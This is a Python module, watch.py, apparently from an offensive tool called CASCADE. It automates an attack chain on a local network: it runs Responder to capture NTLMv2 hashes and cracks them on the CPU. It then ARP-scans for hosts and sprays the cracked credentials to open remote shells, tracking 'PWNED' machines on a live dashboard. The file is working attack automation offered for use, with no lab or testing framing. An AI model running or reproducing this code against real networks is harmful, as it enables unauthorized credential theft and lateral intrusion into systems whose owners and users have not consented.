"""
watch.py — Persistent watch mode: live dashboard, auto-harvest, auto-crack, auto-shell.

Runs indefinitely in background threads:
  ● Responder captures hashes automatically
  ● New hashes → quick CPU crack → if cracked, queue shell attempts
  ● Periodic ARP scan detects hosts coming online/offline
  ● Any new host coming online → tried with all known cracked creds
  ● Live dashboard redraws every 2s showing everything happening
"""

import threading, time, queue, sys, os, subprocess, re
from . import tui, vault, harvest, crack, lateral, logger

_REFRESH    = 2      # display refresh interval (seconds)
_SCAN_EVERY = 60     # ARP scan interval (seconds)
_SPINNER    = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]


# ── shared state ──────────────────────────────────────────────────────────────

class WatchState:
    def __init__(self, iface: str, subnet: str = None):
        self.iface        = iface
        self.subnet       = subnet
        self.start_time   = time.time()
        self.running      = True
        self._tick        = 0          # incremented every refresh for spinner

        # Engine statuses
        self.resp_status  = "starting..."
        self.scan_status  = "waiting..."
        self.crack_status = "idle"
        self.shell_status = "idle"

        # Harvest
        self.seen_hashes  = set()
        self.capture_count = 0

        # Crack results
        self.cracked_count = 0
        self.pending_count = 0

        # Network hosts  ip → { ip, online, cred, shell, note }
        self._hosts       = {}
        self._hosts_lock  = threading.Lock()
        self._last_scan   = 0

        # Shell work queue  { user, secret, source_ip }
        self._shell_q     = queue.Queue()

        # Event log  [ (ts, level, msg) ]
        self._events      = []
        self._ev_lock     = threading.Lock()

    # ── helpers ───────────────────────────────────────────────────────────────

    def log(self, msg: str, level: str = "info"):
        ts = time.strftime("%H:%M:%S")
        with self._ev_lock:
            self._events.append((ts, level, msg))
            if len(self._events) > 20:
                self._events.pop(0)
        logger.info(f"[WATCH] {msg}")

    def events(self, n: int = 12):
        with self._ev_lock:
            return list(self._events[-n:])

    def hosts_snapshot(self):
        with self._hosts_lock:
            return dict(self._hosts)

    def set_host(self, ip: str, **kwargs):
        with self._hosts_lock:
            if ip not in self._hosts:
                self._hosts[ip] = {"ip": ip, "online": False, "cred": None,
                                   "shell": None, "note": ""}
            self._hosts[ip].update(kwargs)

    def uptime(self) -> str:
        s = int(time.time() - self.start_time)
        return f"{s//3600:02d}:{(s%3600)//60:02d}:{s%60:02d}"

    def spinner(self) -> str:
        return _SPINNER[self._tick % len(_SPINNER)]


# ── background threads ────────────────────────────────────────────────────────

def _responder_thread(state: WatchState):
    """Start Responder and monitor for new hashes continuously."""
    harvest.start(state.iface)

    if harvest._proc is None:
        state.resp_status = "FAILED TO START"
        state.log("Responder failed to start — check log", "error")
        return

    state.resp_status = "running"
    state.log(f"Responder started on {state.iface}", "success")

    while state.running:
        time.sleep(3)

        # Check still alive
        if harvest._proc and harvest._proc.poll() is not None:
            state.resp_status = f"died (rc={harvest._proc.returncode})"
            state.log(f"Responder died — restarting ...", "warn")
            harvest.start(state.iface)
            if harvest._proc:
                state.resp_status = "running (restarted)"
            continue

        # Check for new hashes
        for h in harvest.captured():
            if h in state.seen_hashes:
                continue
            state.seen_hashes.add(h)
            state.capture_count += 1

            parts  = h.split("::")
            user   = parts[0] if parts else "unknown"
            domain = parts[1].split(":")[0] if len(parts) > 1 else "?"
            state.log(f"Hash captured: {user}@{domain}", "success")
            state.resp_status = f"running  [{state.capture_count} captured]"

            # Import to vault
            vault.add_hash("unknown", user, domain, h, "NTLMv2")

            # Quick CPU crack
            state.crack_status = f"cracking {user} ..."
            state.log(f"Cracking {user} (quick CPU pass) ...", "info")
            results = crack.crack_ntlmv2_quick([h], target_ip="unknown",
                                               cpu_timeout=90)
            if results:
                pwd = results[0]["password"]
                state.cracked_count += 1
                state.crack_status = f"idle  [{state.cracked_count} cracked]"
                state.log(f"CRACKED: {user} → {pwd}", "success")
                state._shell_q.put({"user": user, "secret": pwd})
            else:
                state.pending_count += 1
                state.crack_status = f"idle  [{state.pending_count} pending GPU]"
                state.log(f"Not cracked by CPU — queued for GPU (run crack mode on Windows)", "warn")

    harvest.stop()
    state.resp_status = "stopped"


def _network_thread(state: WatchState):
    """Periodic ARP scan, detects new/returning hosts, tries known creds."""
    # Load any already-cracked creds from vault on startup
    time.sleep(5)  # let Responder start first

    while state.running:
        state.scan_status = f"scanning {state.iface} ..."
        state.log("Network scan running ...", "info")

        try:
            r = subprocess.run(
                ["sudo", "arp-scan", "-I", state.iface, "--localnet",
                 "--quiet", "--ignoredups"],
                capture_output=True, text=True, timeout=30
            )
            seen = set()
            for line in r.stdout.splitlines():
                parts = line.split()
                if len(parts) >= 2 and re.match(r"\d+\.\d+\.\d+\.\d+", parts[0]):
                    ip = parts[0]
                    seen.add(ip)
                    was_online = state._hosts.get(ip, {}).get("online", False)
                    state.set_host(ip, online=True)
                    if not was_online:
                        state.log(f"Host online: {ip}", "info")
                        # Try all known cracked creds against this new host
                        _try_all_creds(state, ip)

            # Mark missing hosts offline
            with state._hosts_lock:
                for ip in list(state._hosts):
                    if ip not in seen and state._hosts[ip].get("online"):
                        state._hosts[ip]["online"] = False
                        state.log(f"Host offline: {ip}", "warn")

            online = sum(1 for h in state._hosts.values() if h.get("online"))
            state.scan_status = f"idle  [last: {time.strftime('%H:%M:%S')}  {online} online]"
            state._last_scan = time.time()

        except Exception as e:
            state.scan_status = f"error: {e}"
            logger.warn(f"Watch scan error: {e}")

        # Wait for next scan
        for _ in range(_SCAN_EVERY):
            if not state.running:
                break
            time.sleep(1)


def _shell_thread(state: WatchState):
    """Process shell attempt queue — try creds against live hosts."""
    while state.running:
        try:
            cred = state._shell_q.get(timeout=2)
        except queue.Empty:
            continue

        user = cred.get("user", "")
        pwd  = cred.get("secret", "")

        hosts = state.hosts_snapshot()
        live  = [h for h in hosts.values() if h.get("online") and
                 h.get("shell") != "PWNED"]

        if not live:
            state.shell_status = "idle  [no live targets]"
            continue

        state.shell_status = f"spraying {user} → {len(live)} host(s) ..."
        for h in live:
            ip = h["ip"]
            state.log(f"Trying {user} on {ip} ...", "info")
            state.set_host(ip, note=f"trying {user} ...")
            try:
                ok = lateral.get_shell(ip, user, pwd)
                if ok:
                    state.set_host(ip, shell="PWNED", cred=f"{user}:{pwd}", note="SHELL OPEN")
                    state.log(f"SHELL OPENED: {ip} as {user}", "success")
                    state.shell_status = f"PWNED {ip} as {user}"
                else:
                    state.set_host(ip, note="ports blocked / UAC")
                    state.log(f"Shell blocked on {ip}", "warn")
            except Exception as e:
                state.set_host(ip, note=f"error: {e}")
                logger.warn(f"Shell attempt {ip}: {e}")

        state.shell_status = f"idle  [{sum(1 for h in state.hosts_snapshot().values() if h.get('shell')=='PWNED')} PWNED]"


def _try_all_creds(state: WatchState, ip: str):
    """When a new host comes online, try every known cracked vault entry against it."""
    cracked = vault.cracked_entries()
    for e in cracked:
        state._shell_q.put({"user": e["username"], "secret": e["password"]})


# ── display ───────────────────────────────────────────────────────────────────

def _render(state: WatchState) -> str:
    R = tui.R; B = tui.B; WH = tui.WH; DIM = tui.DIM
    GRN = tui.GRN; RED = tui.RED; YLW = tui.YLW
    sp = state.spinner()
    out = []

    # Header
    out.append(f"\n  {RED}{B}◈  CASCADE — WATCH MODE{R}  "
               f"{DIM}{state.iface}  ▸  uptime {state.uptime()}{R}")
    out.append(f"  {'─'*66}")

    # Engines
    out.append(f"\n  {WH}{B}ENGINES{R}")
    def engine_line(icon, name, status):
        col = GRN if "running" in status or "cracked" in status or "PWNED" in status else \
              RED if "FAIL" in status or "died" in status else \
              YLW if "cracking" in status or "scanning" in status or "trying" in status else DIM
        return f"  {col}{icon}{R}  {WH}{name:<14}{R}  {col}{status}{R}"

    resp_icon  = f"{GRN}{sp}{R}" if "running" in state.resp_status else f"{RED}✗{R}"
    scan_icon  = f"{YLW}{sp}{R}" if "scanning" in state.scan_status else f"{GRN}●{R}"
    crack_icon = f"{YLW}{sp}{R}" if "cracking" in state.crack_status else f"{DIM}●{R}"
    shell_icon = f"{YLW}{sp}{R}" if "spraying" in state.shell_status else \
                 f"{GRN}●{R}" if "PWNED" in state.shell_status else f"{DIM}●{R}"

    out.append(engine_line(resp_icon,  "Responder",   state.resp_status))
    out.append(engine_line(scan_icon,  "Net scanner",  state.scan_status))
    out.append(engine_line(crack_icon, "Auto-crack",   state.crack_status))
    out.append(engine_line(shell_icon, "Shell worker", state.shell_status))

    # Network
    out.append(f"\n  {WH}{B}NETWORK{R}")
    out.append(f"  {'─'*66}")
    hosts = state.hosts_snapshot()
    if not hosts:
        out.append(f"  {DIM}(scanning ...){R}")
    else:
        for ip, h in sorted(hosts.items()):
            dot   = f"{GRN}●{R}" if h.get("online") else f"{DIM}○{R}"
            cred  = f"  {YLW}{h['cred']}{R}" if h.get("cred") else ""
            shell = f"  {GRN}{B}SHELL ✓{R}" if h.get("shell") == "PWNED" else ""
            note  = f"  {DIM}{h['note']}{R}" if h.get("note") and not h.get("shell") else ""
            out.append(f"  {dot}  {WH}{ip:<16}{R}{cred}{shell}{note}")

    # Events
    out.append(f"\n  {WH}{B}EVENTS{R}")
    out.append(f"  {'─'*66}")
    for ts, level, msg in state.events(10):
        col = GRN if level == "success" else \
              RED if level == "error"   else \
              YLW if level == "warn"    else DIM
        out.append(f"  {DIM}{ts}{R}  {col}{msg}{R}")

    out.append(f"\n  {DIM}[ type q + Enter to stop ]{R}\n")
    return "\n".join(out)


# ── main entry ────────────────────────────────────────────────────────────────

def run_watch(iface: str, subnet: str = None):
    """
    Launch persistent watch mode. Blocks until user types 'q'.
    Starts background threads for Responder, network scanning, cracking, shells.
    """
    state = WatchState(iface, subnet)

    # Seed known cracked creds from existing vault entries
    cracked = vault.cracked_entries()
    for e in cracked:
        state._shell_q.put({"user": e["username"], "secret": e["password"]})
    if cracked:
        state.log(f"Loaded {len(cracked)} cracked creds from vault", "info")

    # Also retry any pending (unsolved) hashes with quick CPU crack on startup
    pending = vault.pending_hashes()
    if pending:
        state.log(f"Retrying {len(pending)} pending vault hashes (CPU pass) ...", "info")
        def _retry_pending():
            results = crack.crack_ntlmv2_quick(pending, target_ip="vault",
                                               cpu_timeout=120)
            for r in results:
                state.cracked_count += 1
                state.log(f"CRACKED (vault): {r['user']} → {r['password']}", "success")
                state._shell_q.put({"user": r["user"], "secret": r["password"]})
        threading.Thread(target=_retry_pending, daemon=True, name="vault_retry").start()

    threads = [
        threading.Thread(target=_responder_thread, args=(state,), daemon=True, name="responder"),
        threading.Thread(target=_network_thread,   args=(state,), daemon=True, name="netscan"),
        threading.Thread(target=_shell_thread,     args=(state,), daemon=True, name="shell"),
    ]
    for t in threads:
        t.start()

    # Input watcher — 'q' to quit
    def _input_watcher():
        while state.running:
            try:
                line = sys.stdin.readline().strip().lower()
                if line == "q":
                    state.running = False
            except Exception:
                break

    threading.Thread(target=_input_watcher, daemon=True, name="input").start()

    # Display loop
    os.system("clear")
    try:
        while state.running:
            state._tick += 1
            # Clear screen + home, then redraw (prevents bleed-through on line count changes)
            sys.stdout.write("\033[2J\033[H")
            sys.stdout.write(_render(state))
            sys.stdout.flush()
            time.sleep(_REFRESH)
    except KeyboardInterrupt:
        state.running = False

    # Cleanup
    harvest.stop()
    print(f"\n\n  {tui.DIM}Watch mode stopped.{tui.R}\n")
    logger.info("Watch mode stopped")
